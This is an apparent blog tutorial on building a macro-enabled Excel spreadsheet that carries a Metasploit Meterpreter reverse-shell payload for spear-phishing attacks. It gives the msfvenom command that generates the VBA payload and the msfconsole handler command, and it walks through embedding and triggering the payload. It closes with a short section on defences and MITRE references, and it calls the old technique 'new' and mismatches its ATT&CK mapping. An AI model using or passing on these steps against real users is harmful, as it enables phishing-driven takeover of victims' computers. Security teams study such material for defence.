![](https://miro.medium.com/max/1400/0*iwl-kGvpEXgGJgj6.jpg)

In recent years, a new technique has been discovered by threat researchers that are being used by various APTs such as FIN7, BlackEnergy and APT37.

An advanced persistent threat (APT) is a prolonged, targeted cyberattack in which an attacker gains access to a network and remains undetected for an extended period of time. APT attacks are initiated to steal data rather than damage the target organization’s network.

The technique takes advantage of a feature in Office 365 that allows execution of Visual Basic for Applications (VBA) code through macros. This technique can be applied to Word, Excel, PowerPoint and other files. The attacks take place through a malicious campaign, using the spear phishing attack.

Spear phishing is a type of phishing campaign that targets a specific person or group and usually includes information known to be of interest to the target, such as current events or financial documents.

Attacks are typically done via email, where a malicious group sends a large scale of messages to every email address collected about a corporation. Attached to these emails, there is a file that contains malicious VBA code, it can be a spreadsheet or even slides. After a user opens the file, he will receive an alert to allow the macro to be activated, if he allows, the code execution will be successful, infecting the user’s computer.

## Creating a Malicious Spreadsheet

Let’s start by creating a Microsoft Excel spreadsheet and let’s open it.

![](https://miro.medium.com/max/640/1*T_brEIgAbDJVkNgkqVrHtw.png)

To create the macro, go to View > Macros > View Macros.

![](https://miro.medium.com/max/828/1*7I2PbzA1eRqG82zfyc-snQ.png)

Afterwards, type a name for the macro and click create.

![](https://miro.medium.com/max/640/1*loX4KRx5O5aQwar7DTX19A.png)

![](https://miro.medium.com/max/828/1*nz5VMhtvd_hH2rD4wshwUA.png)

Now we need to create the VBA malicious code, for that I will use the metasploit tool to generate and do all the communication between the attacker’s and the victim’s machine.

Let’s generate a VBA payload:

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP/HOST> LPORT=<PORT> -f vba
```

![](https://miro.medium.com/max/828/1*1UuMyy3Kxv8FjHkkVgPmgA.png)

After the payload has been generated, copy and paste it into the macro module.

![](https://miro.medium.com/max/828/1*P8b9eBK0ZzUuX8SPipLV9w.png)

After placing the payload, save the file by clicking on the icon above in the right corner.

![](https://miro.medium.com/max/828/1*T76D0oThgn_dbjmAuFUhKw.png)

When you get a message box, click no button and select excel format with macro support and save the file.

![](https://miro.medium.com/max/828/1*AcqgLSeGyhqj3y-uxdTOVw.png)

![](https://miro.medium.com/max/828/1*7CcaSwTBczqwfgc9OpjPMw.png)

When finished, close Microsoft Excel and notice the difference between the two files.

![](https://miro.medium.com/max/550/1*xQErf2fQSJ4bRJvn3ackGg.png)

On the attacker’s machine, start listening for metasploit with the following commands:

```
msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set lhost <IP/HOST>;set lport <PORT>;run"
```

After listening is enabled, open the malicious file and accept the risk of running the macro.

![](https://miro.medium.com/max/828/1*yI2fl4CnDtHV20H960_AOw.png)

![](https://miro.medium.com/max/828/1*VPqlcsIDWzvV_-jNF2PUhg.png)

The connection was made and the user’s machine was successfully taken over.

## Recommendations

To stop this problem, a good Endpoint Detection and Response (EDR) on the infrastructure is a great solution, as it will protect your network from any suspicious movement and will alert you. Also disable Office add-ins, to block any execution of macros injected into a file.

## Conclusion

This article demonstrates a new technique used by APTs around the world. It is important to note that these attacks often have messages telling you to allow the macro to run, as if it were something legitimate. The new technique was defined as Office Application Startup: Office Template Macros by MITER ATT&CK, with the persistence tactic, and the ID was identified as T1137.001.

## References

* https://attack.mitre.org/techniques/T1137/001/
* https://securelist.com/blackenergy-apt-attacks-in-ukraine-employ-spearphishing-with-word-documents/73440/
* https://digital.nhs.uk/cyber-alerts/2017/cc-1707
* https://www.malwarebytes.com/blog/news/2021/01/retrohunting-apt37-north-korean-apt-used-vba-self-decode-technique-to-inject-rokrat
